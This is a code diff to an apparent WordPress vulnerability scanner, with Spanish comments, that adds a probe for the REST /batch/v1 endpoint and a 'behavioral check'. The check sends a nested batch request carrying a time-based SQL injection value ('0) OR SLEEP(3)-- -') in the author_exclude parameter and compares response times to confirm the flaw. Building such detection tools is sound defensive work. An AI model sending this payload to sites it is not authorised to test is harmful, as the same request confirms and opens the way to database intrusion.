@@ -22,6 +22,7 @@ export interface ScanResult {
   batch: BatchResult;
   wpLogin: boolean;
   remediation: string[];
+  behavioral: { vulnerable: boolean | null; signal: string } | null;
 }
 
 export interface SafeFetchResponse {
@@ -32,6 +33,7 @@ export interface SafeFetchResponse {
 
 export interface SafeFetchOptions {
   method?: "GET" | "POST";
+  body?: string;
   redirectCount?: number;
 }
 
@@ -373,31 +375,41 @@ async function probeBatchEndpoint(
 ): Promise<BatchResult> {
   let status: number | null = null;
 
-  try {
-    const result = await fetchFn(`${baseUrl}/wp-json/batch/v1`, { method: "POST" });
-    status = result.status;
-  } catch {
+  // Probar ambas rutas: /wp-json/batch/v1 y /?rest_route=/batch/v1/
+  const urls = [
+    `${baseUrl}/wp-json/batch/v1`,
+    `${baseUrl}/?rest_route=/batch/v1/`,
+  ];
+
+  for (const url of urls) {
     try {
-      const result = await fetchFn(`${baseUrl}/wp-json/batch/v1`);
+      const result = await fetchFn(url, { method: "POST" });
       status = result.status;
     } catch {
-      return { accessible: false, status: null };
+      try {
+        const result = await fetchFn(url);
+        status = result.status;
+      } catch {
+        continue;
+      }
     }
+
+    if (status === 403) return { accessible: false, status: 403 };
+    if (
+      status === 200 ||
+      status === 207 ||
+      status === 400 ||
+      status === 401 ||
+      status === 405 ||
+      status === 406 ||
+      status === 415 ||
+      status === 422
+    ) {
+      return { accessible: true, status };
+    }
+    if (status === 404) continue; // probar la otra ruta
   }
 
-  if (status === 403) return { accessible: false, status: 403 };
-  if (
-    status === 200 ||
-    status === 207 ||
-    status === 400 ||
-    status === 401 ||
-    status === 405 ||
-    status === 406 ||
-    status === 415 ||
-    status === 422
-  ) {
-    return { accessible: true, status };
-  }
   if (status === 404) return { accessible: false, status: 404 };
   return { accessible: false, status };
 }
@@ -409,6 +421,103 @@ async function detectWpLogin(baseUrl: string, fetchFn: SafeFetch): Promise<boole
   } catch {
     return false;
   }
+}
+
+function median(values: number[]): number {
+  const sorted = [...values].sort((a, b) => a - b);
+  const mid = Math.floor(sorted.length / 2);
+  return sorted.length % 2 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
+}
+
+function buildNestedBatchPayload(authorNotInValue: string): object {
+  const encoded = encodeURIComponent(authorNotInValue);
+  const inner = {
+    validation: "normal",
+    requests: [
+      { method: "POST", path: "///" },
+      { method: "GET", path: `/wp/v2/users?author_exclude=${encoded}` },
+      { method: "GET", path: "/wp/v2/posts" },
+    ],
+  };
+  return {
+    validation: "normal",
+    requests: [
+      { method: "POST", path: "///" },
+      { method: "POST", path: "/wp/v2/posts", body: inner },
+      { method: "POST", path: "/batch/v1", body: { requests: [] } },
+    ],
+  };
+}
+
+async function behavioralCheck(
+  baseUrl: string,
+  fetchFn: SafeFetch
+): Promise<{ vulnerable: boolean | null; signal: string }> {
+  const batchUrl = `${baseUrl}/?rest_route=/batch/v1/`;
+
+  const takeSample = async (sleepSec: number): Promise<number | null> => {
+    const value = `0) OR SLEEP(${sleepSec})-- -`;
+    const body = JSON.stringify(buildNestedBatchPayload(value));
+    const t0 = Date.now();
+    try {
+      await fetchFn(batchUrl, { method: "POST", body });
+      return Date.now() - t0;
+    } catch {
+      return null;
+    }
+  };
+
+  // Warm-up
+  await takeSample(0);
+
+  // Baseline: 2 muestras SLEEP(0)
+  const baseline: number[] = [];
+  for (let i = 0; i < 3; i++) {
+    const t = await takeSample(0);
+    if (t !== null) baseline.push(t);
+    if (baseline.length >= 2) break;
+  }
+
+  if (baseline.length < 2) {
+    return {
+      vulnerable: null,
+      signal:
+        "Prueba conductual (SLEEP oracle) no pudo completarse: las peticiones de referencia fallaron.",
+    };
+  }
+
+  // Test: 2 muestras SLEEP(3)
+  const test: number[] = [];
+  for (let i = 0; i < 3; i++) {
+    const t = await takeSample(3);
+    if (t !== null) test.push(t);
+    if (test.length >= 2) break;
+  }
+
+  if (test.length < 2) {
+    return {
+      vulnerable: null,
+      signal:
+        "Prueba conductual (SLEEP oracle) no pudo completarse: las peticiones de inyección fallaron.",
+    };
+  }
+
+  const baseMedian = median(baseline) / 1000;
+  const testMedian = median(test) / 1000;
+  const delta = testMedian - baseMedian;
+  const threshold = 2.0;
+
+  if (delta >= threshold) {
+    return {
+      vulnerable: true,
+      signal: `Prueba conductual POSITIVA: SLEEP(3) tardó ${testMedian.toFixed(1)}s vs ${baseMedian.toFixed(1)}s de referencia (Δ=${delta.toFixed(1)}s, umbral ${threshold}s). El sitio ES vulnerable a la inyección SQL.`,
+    };
+  }
+
+  return {
+    vulnerable: false,
+    signal: `Prueba conductual negativa: sin diferencia de tiempo significativa (Δ=${delta.toFixed(1)}s, umbral ${threshold}s). El sitio parece estar parcheado o no es vulnerable.`,
+  };
 }
 
 export async function runScan(baseUrl: string, fetchFn: SafeFetch): Promise<ScanResult> {
@@ -536,7 +645,32 @@ export async function runScan(baseUrl: string, fetchFn: SafeFetch): Promise<Scan
     );
   }
 
-  const verdict = computeVerdict(detectedVersion, markersFound.length > 0, batch);
+  // Prueba conductual (SLEEP oracle): solo cuando el batch es accesible y no
+  // tenemos una versión fiable — evita ejecutar SQL innecesario en sitios claramente safe.
+  let behavioralResult: { vulnerable: boolean | null; signal: string } | null = null;
+  if (batch.accessible && (!detectedVersion || versionLt(detectedVersion, [6, 9, 0]))) {
+    behavioralResult = await behavioralCheck(baseUrl, fetchFn);
+    if (behavioralResult.signal) signals.push(behavioralResult.signal);
+  }
+
+  let verdict: Verdict;
+  if (behavioralResult?.vulnerable === true) {
+    verdict = {
+      level: "vulnerable",
+      title: "Vulnerable — confirmado por prueba conductual",
+      detail:
+        "La prueba de inyección SLEEP confirmó que el endpoint batch es vulnerable a la inyección SQL. Actualiza WordPress inmediatamente.",
+    };
+  } else if (behavioralResult?.vulnerable === false) {
+    verdict = {
+      level: "safe",
+      title: "No vulnerable — prueba conductual negativa",
+      detail:
+        "La prueba de inyección SLEEP no mostró diferencia de tiempo. El sitio no es vulnerable a la inyección SQL del batch endpoint, o ya está parcheado.",
+    };
+  } else {
+    verdict = computeVerdict(detectedVersion, markersFound.length > 0, batch);
+  }
   const remediation = buildRemediation(verdict);
 
   return {
@@ -548,5 +682,6 @@ export async function runScan(baseUrl: string, fetchFn: SafeFetch): Promise<Scan
     batch,
     wpLogin,
     remediation,
+    behavioral: behavioralResult,
   };
 }
